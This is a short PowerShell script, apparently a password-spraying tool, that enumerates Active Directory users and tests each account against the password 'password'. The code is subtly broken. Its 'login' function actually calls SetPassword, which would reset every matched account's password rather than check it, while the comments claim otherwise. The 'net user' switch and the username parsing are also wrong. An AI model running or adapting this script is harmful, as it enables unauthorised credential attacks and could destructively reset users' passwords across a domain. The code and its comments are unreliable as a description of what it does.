Function LoginLDAP {
    Param(
        [String]$username,
        [String]$password
    )
    # Create an ldap connection
    $LDAP = New-Object 'System.DirectoryServices.DirectorySearcher'([ADSI] "LDAP://")
    $LDAP.Filter = "(&(ObjectClass=user)(sAMAccountName={0}))" -f ($username)
    $LDAPResult = $LDAP.FindOne()

    # Attempt to log user with password
    Try { 
        $LDAPResult.GetDirectoryEntry().Invoke("SetPassword",$password)
    } 
    # Catch any authentication errors - returns nothing if authentication was successful
    Catch {
        Return $false
    }

    Return $true
}

# Run a 'net user' command
$netUserOutput = net user \domain

# Find all usernames with the output of net user command
$usernames = $netUserOutput | Select-String -Pattern "\w+(?=\s*$)" | Foreach-Object {$_.Matches.Value}

# Iterate over each user and attempt to login with password 'password'
$usernames | ForEach-Object {
    if (LoginLDAP -username $_ -password 'password') {
        # Output their username if login was successful
        Write-Output $_
    }
}